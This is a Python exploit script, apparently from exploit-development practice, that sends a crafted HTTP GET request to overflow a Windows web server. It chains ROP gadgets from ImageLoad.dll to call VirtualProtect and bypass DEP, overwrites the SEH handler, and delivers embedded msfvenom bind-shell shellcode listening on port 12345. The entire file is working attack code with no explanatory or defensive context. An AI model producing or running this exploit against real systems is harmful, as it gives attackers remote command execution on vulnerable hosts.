import socket
import os
import sys
import struct

ip = "127.0.0.1"
port = 80

#\x00\x0a\x0d\x20\x25\x2f\x5c
#virtualProtect --> 61C832D0
#GOALS - VirtualProtect
#EAX 90909090 => Nop                                              
#ECX <writeable pointer> => lpflOldProtect                                
#EDX 00000040 => flNewProtect                                   
#EBX 00000201 => dwSize   512                                      
#ESP ???????? => Leave as is                                 
#EBP ???????? => Call to ESP (jmp, call, push,..) -> !py mona jmp -r esp -cpb '\x00'              
#ESI ???????? => PTR to VirtualProtect - DWORD PTR of VirtualProtect 
#EDI RETN => ROP-Nop same as EIP  --> !py mona find -type instr -s "retn" -m modulo.dll -cpb "\x00"

#msfvenom -p windows/shell_bind_tcp LPORT=12345 -f python -v shellcode -b '\x00\x20\x25\x2b\x2f\x5c' EXITFUNC=thread 
shellcode =  b""
shellcode += b"\xd9\xce\xd9\x74\x24\xf4\x58\xbe\x9b\x9b\x91"
shellcode += b"\x9c\x31\xc9\xb1\x53\x31\x70\x17\x03\x70\x17"
shellcode += b"\x83\x73\x67\x73\x69\x7f\x70\xf6\x92\x7f\x81"
shellcode += b"\x97\x1b\x9a\xb0\x97\x78\xef\xe3\x27\x0a\xbd"
shellcode += b"\x0f\xc3\x5e\x55\x9b\xa1\x76\x5a\x2c\x0f\xa1"
shellcode += b"\x55\xad\x3c\x91\xf4\x2d\x3f\xc6\xd6\x0c\xf0"
shellcode += b"\x1b\x17\x48\xed\xd6\x45\x01\x79\x44\x79\x26"
shellcode += b"\x37\x55\xf2\x74\xd9\xdd\xe7\xcd\xd8\xcc\xb6"
shellcode += b"\x46\x83\xce\x39\x8a\xbf\x46\x21\xcf\xfa\x11"
shellcode += b"\xda\x3b\x70\xa0\x0a\x72\x79\x0f\x73\xba\x88"
shellcode += b"\x51\xb4\x7d\x73\x24\xcc\x7d\x0e\x3f\x0b\xff"
shellcode += b"\xd4\xca\x8f\xa7\x9f\x6d\x6b\x59\x73\xeb\xf8"
shellcode += b"\x55\x38\x7f\xa6\x79\xbf\xac\xdd\x86\x34\x53"
shellcode += b"\x31\x0f\x0e\x70\x95\x4b\xd4\x19\x8c\x31\xbb"
shellcode += b"\x26\xce\x99\x64\x83\x85\x34\x70\xbe\xc4\x50"
shellcode += b"\xb5\xf3\xf6\xa0\xd1\x84\x85\x92\x7e\x3f\x01"
shellcode += b"\x9f\xf7\x99\xd6\xe0\x2d\x5d\x48\x1f\xce\x9e"
shellcode += b"\x41\xe4\x9a\xce\xf9\xcd\xa2\x84\xf9\xf2\x76"
shellcode += b"\x30\xf1\x55\x29\x27\xfc\x26\x99\xe7\xae\xce"
shellcode += b"\xf3\xe7\x91\xef\xfb\x2d\xba\x98\x01\xce\xf4"
shellcode += b"\x61\x8f\x28\x9e\x81\xd9\xe3\x36\x60\x3e\x3c"
shellcode += b"\xa1\x9b\x14\x14\x45\xd3\x7e\xa3\x6a\xe4\x54"
shellcode += b"\x83\xfc\x6f\xbb\x17\x1d\x70\x96\x3f\x4a\xe7"
shellcode += b"\x6c\xae\x39\x99\x71\xfb\xa9\x3a\xe3\x60\x29"
shellcode += b"\x34\x18\x3f\x7e\x11\xee\x36\xea\x8f\x49\xe1"
shellcode += b"\x08\x52\x0f\xca\x88\x89\xec\xd5\x11\x5f\x48"
shellcode += b"\xf2\x01\x99\x51\xbe\x75\x75\x04\x68\x23\x33"
shellcode += b"\xfe\xda\x9d\xed\xad\xb4\x49\x6b\x9e\x06\x0f"
shellcode += b"\x74\xcb\xf0\xef\xc5\xa2\x44\x10\xe9\x22\x41"
shellcode += b"\x69\x17\xd3\xae\xa0\x93\xf3\x4c\x60\xee\x9b"
shellcode += b"\xc8\xe1\x53\xc6\xea\xdc\x90\xff\x68\xd4\x68"
shellcode += b"\x04\x70\x9d\x6d\x40\x36\x4e\x1c\xd9\xd3\x70"
shellcode += b"\xb3\xda\xf1"

CRASH_LEN = 5000  # change me
OFFSET_SEH = 4065  # change me
OFFSET_ADD = 2509  # change me

rop_nop = struct.pack("<I",0x100101b7) # RETN

#EAX - 
eax = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] ** 
eax += struct.pack("<I",0x90909090) 

#ECX - 
ecx = struct.pack("<I",0x10010102)  # POP ECX # RETN    ** [ImageLoad.dll] ** 
ecx += struct.pack("<I",0x1004df10)  #RW address in ImageLoad

#EDX - 
edx = struct.pack("<I",0x10022c4c)  # XOR EDX,EDX # RETN    ** 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN  
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 
edx += struct.pack("<I",0x61c059a0)  # INC EDX # ADD AL,0C9 # RETN 

#EBX - 
ebx = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] **
ebx += struct.pack("<I",0xfffffdff) # -201
ebx += struct.pack("<I",0x100231d1)  # NEG EAX # RETN   
ebx += struct.pack("<I",0x1001da09) # ADD EBX,EAX # MOV EAX,DWORD PTR [ESP+0CH] # INC DWORD PTR [EAX] # RETN 
ebx += rop_nop 
ebx += rop_nop
ebx += struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] **
ebx += struct.pack("<I",0x1004df10)  #RW address in ImageLoad

#EBP - 
ebp = struct.pack("<I",0x1001bab0)  # POP EBP # RETN    ** [ImageLoad.dll] **
ebp += struct.pack("<I",0x61c227fa) # push esp # ret

#ESI - 
esi = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] **
esi += struct.pack("<I",0x61C832D0) #ptr to VirtualAlloc
esi += struct.pack("<I",0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN
esi += struct.pack("<I",0x61c0a798)  # XCHG EAX,EDI # RETN   
esi += struct.pack("<I",0x1001d626)  # XOR ESI,ESI # RETN 
esi += struct.pack("<I",0x10021a3e)  # ADD ESI,EDI # RETN 0x00 

#EDI
edi = struct.pack("<I",0x100161e6)  # POP EDI # RETN 
edi += rop_nop

#PUSHAD
pushad = struct.pack("<I",0x100240c2)  # PUSHAD # RETN 

rop = esi 
rop += ebx
rop += ecx
rop += edx
rop += ebp
rop += edi
rop += eax
rop += pushad


payload = b"A" * OFFSET_ADD
payload += rop
payload += b"\x90"*20
payload += shellcode
payload += b"\x90"*20
payload += b"C" * (OFFSET_SEH - len(payload) - 4)
payload += b"B"*4 #SEH
payload += struct.pack("<I",0x10022869)  # ADD ESP,1004 # RETN #NSEH 
payload += b"D" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
